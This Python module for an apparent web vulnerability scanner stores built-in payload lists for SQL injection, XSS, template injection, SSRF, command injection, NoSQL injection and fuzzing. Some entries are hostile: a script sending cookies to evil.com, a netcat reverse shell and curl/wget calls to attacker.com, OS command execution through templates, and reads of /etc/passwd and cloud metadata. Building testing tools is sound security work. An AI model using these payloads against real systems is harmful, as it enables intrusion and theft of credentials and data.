"""
Payload Store — Thread-safe singleton for custom payload management.
Stores uploaded wordlists and built-in payload libraries per session.
"""
import threading
from typing import Optional


# ── Built-in Payload Libraries ────────────────────────────────────────────────

BUILTIN_LIBRARIES = {
    'sqli': [
        "' OR '1'='1", "' OR 1=1--", '" OR "1"="1', "1; SELECT 1",
        "' UNION SELECT NULL--", "'; SELECT SLEEP(0)--", "admin'--",
        "' OR 'x'='x", "'/**/OR/**/1=1--", "' /*!OR*/ '1'='1",
        "%27 OR %271%27=%271", "' OR 1=1#", "';--", "' OR ''='",
        "1' AND '1'='1", "' AND 1=1--", "' AND 1=2--",
        "' UNION SELECT NULL,NULL--", "' UNION ALL SELECT NULL--",
        "1 UNION SELECT 1,2,3--",
    ],
    'xss': [
        '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>',
        "';alert(1)//", '<svg onload=alert(1)>', 'javascript:alert(1)',
        '<body onload=alert(1)>', '<iframe src="javascript:alert(1)">',
        '"><img src=x onerror=alert(document.cookie)>',
        '<script>fetch("https://evil.com/"+document.cookie)</script>',
        '{{constructor.constructor("return this")().alert(1)}}',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        "'-alert(1)-'", '"><svg/onload=alert(1)//',
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    ],
    'ssti': [
        '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}',
        '{{config}}', '{{self.__class__.__mro__}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
        '{% import os %}{{ os.popen("id").read() }}',
        '{{"".__class__.__mro__[1].__subclasses__()}}',
        "${{\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        '{{lipsum.__globals__["os"].popen("id").read()}}',
    ],
    'ssrf': [
        'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
        'http://[::1]', 'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://100.100.100.200/latest/meta-data/',
        'http://169.254.169.254/metadata/v1/',
        'http://127.0.0.1:8080', 'http://127.0.0.1:3000',
        'http://127.0.0.1:6379', 'http://127.0.0.1:27017',
        'gopher://127.0.0.1:25/', 'file:///etc/passwd',
        'dict://127.0.0.1:11211/', 'http://0177.0.0.1/',
        'http://2130706433/', 'http://0x7f000001/',
    ],
    'cmdi': [
        '; id', '| id', '`id`', '; whoami', '| cat /etc/passwd',
        '; ls -la', '&& id', '$(id)', '; uname -a',
        '| nc -e /bin/sh attacker.com 4444', '; curl attacker.com',
        '`curl attacker.com`', '$(curl attacker.com)',
        '; ping -c 3 attacker.com', '| wget attacker.com',
        '; echo vulnerable', '&& echo vulnerable',
        '|| echo vulnerable', '\nid', '\r\nid',
    ],
    'nosql': [
        '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
        '{"$regex": ".*"}', '{"$exists": true}',
        '{"$nin": []}', '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        '{"$or": [{"a": 1}, {"b": 1}]}',
        '{"$where": "function(){return true}"}',
        'true, $where: "1 == 1"',
    ],
    'fuzzing': [
        '', ' ', '\x00', '\x00' * 100, 'A' * 50000,
        '{{{', '[null', '{"a":undefined}', '{"a":NaN}',
        '{"id": true}', '{"id": null}', '{"id": [1,2,3]}',
        '{"id": 2147483647}', '{"id": -2147483649}',
        '{"id": 9007199254740992}', '\xff\xfe', '\xef\xbb\xbf',
        '\r\n' * 1000, '\x1b[31mRED\x1b[0m',
        '{"__proto__": {"admin": true}}',
    ],
}


class PayloadStore:
    """Thread-safe singleton for managing custom payloads."""

    def __init__(self):
        self._custom_payloads: list[str] = []
        self._template: str = '{{INJECT}}'
        self._active_library: str = ''
        self._lock = threading.Lock()

    def set(self, payloads: list[str]) -> int:
        """Store uploaded custom payloads. Returns count."""
        with self._lock:
            self._custom_payloads = [p for p in payloads if p]
            self._active_library = 'custom'
            return len(self._custom_payloads)

    def set_template(self, template: str):
        """Set the injection template (must contain {{INJECT}})."""
        with self._lock:
            if '{{INJECT}}' in template:
                self._template = template
            else:
                self._template = template + '{{INJECT}}'

    def get_template(self) -> str:
        with self._lock:
            return self._template

    def load_library(self, name: str) -> list[str]:
        """Load a built-in payload library by name."""
        name = name.lower().strip()
        if name in BUILTIN_LIBRARIES:
            with self._lock:
                self._custom_payloads = list(BUILTIN_LIBRARIES[name])
                self._active_library = name
            return self._custom_payloads
        return []

    def get(self) -> list[str]:
        """Get current custom payloads (empty if none set)."""
        with self._lock:
            return list(self._custom_payloads)

    def get_active_library(self) -> str:
        with self._lock:
            return self._active_library

    def preview(self, n: int = 10) -> list[str]:
        """Get first N payloads for preview."""
        with self._lock:
            return list(self._custom_payloads[:n])

    def count(self) -> int:
        with self._lock:
            return len(self._custom_payloads)

    def clear(self):
        with self._lock:
            self._custom_payloads.clear()
            self._template = '{{INJECT}}'
            self._active_library = ''

    def available_libraries(self) -> list[dict]:
        """Return list of built-in libraries with descriptions."""
        return [
            {'name': 'sqli',    'label': 'SQL Injection',        'count': len(BUILTIN_LIBRARIES['sqli'])},
            {'name': 'xss',     'label': 'XSS Payloads',         'count': len(BUILTIN_LIBRARIES['xss'])},
            {'name': 'ssti',    'label': 'SSTI Payloads',        'count': len(BUILTIN_LIBRARIES['ssti'])},
            {'name': 'ssrf',    'label': 'SSRF Payloads',        'count': len(BUILTIN_LIBRARIES['ssrf'])},
            {'name': 'cmdi',    'label': 'Command Injection',    'count': len(BUILTIN_LIBRARIES['cmdi'])},
            {'name': 'nosql',   'label': 'NoSQL Injection',      'count': len(BUILTIN_LIBRARIES['nosql'])},
            {'name': 'fuzzing', 'label': 'Fuzzing Payloads',     'count': len(BUILTIN_LIBRARIES['fuzzing'])},
        ]


# Global singleton
payload_store = PayloadStore()
